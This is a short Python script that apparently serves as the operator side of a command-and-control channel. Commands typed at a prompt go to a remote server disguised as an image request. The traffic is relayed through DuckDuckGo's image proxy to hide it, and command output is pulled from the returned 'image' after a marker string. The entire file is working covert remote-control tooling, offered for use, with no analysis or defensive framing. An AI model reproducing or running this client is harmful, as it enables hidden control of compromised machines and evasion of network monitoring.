import requests
import readline
import re

magic = 'deadbeef'
c2_url = 'https://pdxkmdcepvahysnnxe.pythonanywhere.com/image.jpg?cmd='
ddg_url = 'https://proxy.duckduckgo.com/iu/?u='

def send(cmd):
    r = requests.get(f'{ddg_url}{c2_url}{cmd}', stream=True)
    if r.status_code == 200:
        return r.raw.read()
    return

def parse(img):
    i = re.search(magic.encode(), img).start()
    return img[i+8:].decode()

while True:
    cmd = input('# ')
    result = send(cmd)
    #print(result)
    if not result: 
        print('Error getting data. Try again.')
    else:
        print(parse(result))
